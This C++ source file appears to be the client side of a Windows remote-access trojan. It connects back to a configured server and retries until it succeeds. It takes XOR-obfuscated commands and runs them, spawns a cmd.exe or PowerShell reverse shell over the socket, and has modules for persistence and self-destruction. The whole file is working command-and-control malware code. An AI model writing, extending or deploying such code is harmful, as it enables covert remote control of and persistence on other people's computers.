//#define WIN32_LEAN_AND_MEAN

#include "../inc/Connexion.h"
#include "../inc/common.h"
#include "../inc/Persistence.h"
#include "../inc/other.h"
#include "../inc/Exec.h"
#include "../inc/Destruction.h"

using namespace std;


Connexion::Connexion()
{
    ;
} //Constructor


INT Connexion::openConnexion()
{     
    Sleep(500);

    WSADATA WSAData; 
    
    SOCKADDR_IN address_client;

    WSAStartup(MAKEWORD(2,0), &WSAData);
    
    sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket

    address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
    address_client.sin_family = AF_INET;
    address_client.sin_port = htons(PORT);

    while(connect(sock_client,(SOCKADDR *)&address_client, sizeof(address_client)))
    {   
        Sleep(TIMEOUT_SOCK_RECONNECT);
        //Whait...;  
    } 
    return 0;
}


INT Connexion::main()
{   
    wstring command;
    wstring status;
    vector <string> result;
    INT len_recv=0;    
    BOOL status_destruction = FALSE; //Test if error in Destruction
    
    while(true)
    {
        //Sleep(1000);

        command = recvSafe(); //Recv safe and decrypt xor
        
        wcout << "command recv: " << command << "<----" <<endl;
        wcout << "len: " << command.length() << endl;
        

        if(command.find(L"is_life?") != wstring::npos)
        {
            ;
            //if find is_life then continue
            cout << "life baby " << endl;
        }

        else
        {
            //cout << "command in main ---->" << command.substr(0,command.length()-1) <<"<------------"<<endl;
            if(command==L"exit")//change 
            {
                break;
            }
            else if (command.empty())
            {
                //Connection is down or error.
                ;
            }
            else if(command.substr(0,2)==L"cd")
            {
            //Change directory
                if(changeDirectory(command))
                {
                    result.push_back("Error when changing folder.");
                }
                else
                {
                    result.push_back(ConvertWideToUtf8(getPath()));   
                }
                sendSafe(result);
            }

            else if(command.substr(0,16) == L"MOD_SPAWN_SHELL:")
            {   
                //test if cmd.exe or powershell.exe
                WCHAR prog[20];

                if(command.substr(16, command.length()) == L"cmd.exe")
                {
                    wcscpy(prog, L"cmd.exe");
                    Exec().spawnSHELL(sock_client,prog);
                }

                else
                {      
                    wcscpy(prog, L"powershell.exe");
                    Exec().spawnSHELL(sock_client,prog);
                }

            }
            else if(command.substr(0,8)==L"MOD_ALL:")
            {
                Exec().executeCommand(command.substr(8));   
            }

            else if (command.substr(0,16) == L"MOD_PERSISTENCE:")
            {
                //In mod persistence.
                Persistence persistence(a_is_admin, a_path_prog);
                persistence.main();

                if(command.substr(16) == L"default") //The client sends a response to the server to report whether the persistence was successfully completed. 
                {
                    send(sock_client, (char *)XOREncryption(L"\r\n").c_str(), 4 ,0);    
                }
                else
                {
                    //cout << "broadcast persi" << endl;
                    ;
                }
            }
            
            else if (command.substr(0,16) == L"MOD_DESTRUCTION:") 
            { 
                Destruction destruction(a_path_prog);

                status_destruction = destruction.main();

                if(status_destruction) //Go destruction !
                {
                    //If error
                    //string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
                    status = L"MOD_DESTRUCTION:" SPLIT  "True";// "[-] An error occurred while executing the destroy mode.";
                }
                else
                {
                    status = L"MOD_DESTRUCTION:" SPLIT  "False";//"[+] The destruction mode is executed successfully.";
                }  


                if(command.substr(16,7) == L"default") //6 for default
                {
                    //if default then send status at server. 
                    //send default persi
                    send(sock_client, (char *)XOREncryption(status).c_str(), status.length(), 0); //Send the statue to the server. The server will just display the status.
                }
                
                else //else  substr(15,6) == "broadcast"
                {
                    //not send status
                    ;
                }
                closeConnexion();
                exit(0);
            }

            else
            {
                result = Exec().executeCommand(command);
                if(command.substr(0,3) == L"[-]")
                {;} //if error not append path.
                else
                {
                    result.push_back("\n"); //test
                    wcout << "GET PATHL: " << getPath() << endl;
                    result.push_back(ConvertWideToUtf8(getPath()));
                }
                
                sendSafe(result);
            }
        }
        command.erase(); 
        result.clear(); 
    }
    return 0;
}


wstring Connexion::recvSafe()
{
    //allows you to receive data while managing errors 
    WCHAR buffer[BUFFER_LEN];
    INT len_recv;
    wstring result;
    ZeroMemory(&buffer, wcslen(buffer));

    len_recv=recv(sock_client,(char *)buffer, sizeof(buffer), 0);
        
    if(len_recv==SOCKET_ERROR)
    {
        reConnect(); //?
        //return 1;
    }
    else
    {
        if(wcslen(buffer) == 0)
        {
            //If command empty re connect to server.
            wcout << "go to reconnect" << endl;
            reConnect();
            return L"";
        }
        wcout << "len recv: " << len_recv << endl;
       // result.append(buffer, len_recv);
       result = buffer;
    }
    wcout << "buffer: " << buffer << endl;
    wcout << "result: " << result << endl;

    return XOREncryption(result);
}


VOID Connexion::sendSafe(vector<string> result_of_command)
{ /*send data and manage errors, also allows to segment the data if it is too big.
Once the function is finished send "\r\n" to signal to the server that the client has nothing more to send. */
    INT iResult=0;
    INT i=0;
    
    INT size_all_result_of_command = 0;
    //const wstring end = "\r\n"; //END CONNECTION.
    wstring request;

    if(result_of_command.size() >= 1) 
    {        
        // Multiple request: 
        for(i=0;i< result_of_command.size(); i++)
        {            
            request = XOREncryption(ConvertUtf8ToWide(result_of_command[i]));
    
            send(sock_client, (char *)request.c_str(),  request.length()* sizeof(WCHAR) ,0);
            size_all_result_of_command += request.length();   
            wcout << "len request: " <<  request.length()<< endl;
            wcout << "len request wchar: " << request.length()* sizeof(WCHAR) << "\n" << endl;
            Sleep(100);   
        }
    }
    
    wcout << size_all_result_of_command << endl;
    
    iResult=send(sock_client, (char *)XOREncryption(L"\r\n").c_str() ,4 ,0); // send end communication.
    checkSend(iResult);
}


VOID Connexion::checkSend(INT &iResult)
{
    //Test if an error occurs when sending data 
    if(iResult == SOCKET_ERROR)
    {
        //cout << "error in sendSafe" << endl;
        reConnect();
    }
}


VOID Connexion::closeConnexion()
{   
    // Test if he can connect several times to the server.
    // Test if it should wait after x second (s) to reconnect to the server.

    //"Close socket successful.
    closesocket(sock_client);
    WSACleanup(); //The WSACleanup function terminates use of the Winsock 2 DLL (Ws2_32.dll).
}


VOID Connexion::reConnect()
{   
    //if the client has a token then reconnects without handshaking
    wstring request;

    closeConnexion();
    openConnexion();

    request = L"MOD_RECONNECT" SPLIT  + a_token;
    
    sendUltraSafe(sock_client, XOREncryption(request)); //send token
    sendUltraSafe(sock_client, XOREncryption(L"\r\n"));
}


SOCKET Connexion::getSocket()
{
    return sock_client;
}


VOID Connexion::setToken(wstring token)
{
    if(!token.empty())
    {
        a_token = token;
    }
    else
    {
        //if token is empty.
        WCHAR hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
        INT i;

        srand(time(0)); 

        for(i=0;i< 24 ;i++){token += hex_characters[rand()%16];}
        a_token = token; 
    }
    
}

VOID Connexion::setIsAdmin(BOOL is_admin)
{
    if(is_admin)
    {
        a_is_admin = TRUE; //is admin
    }
    else
    {
        a_is_admin = FALSE; //is not admin
    }
}


VOID Connexion::setPathProg(wstring path_prog)
{
    a_path_prog = path_prog;
}

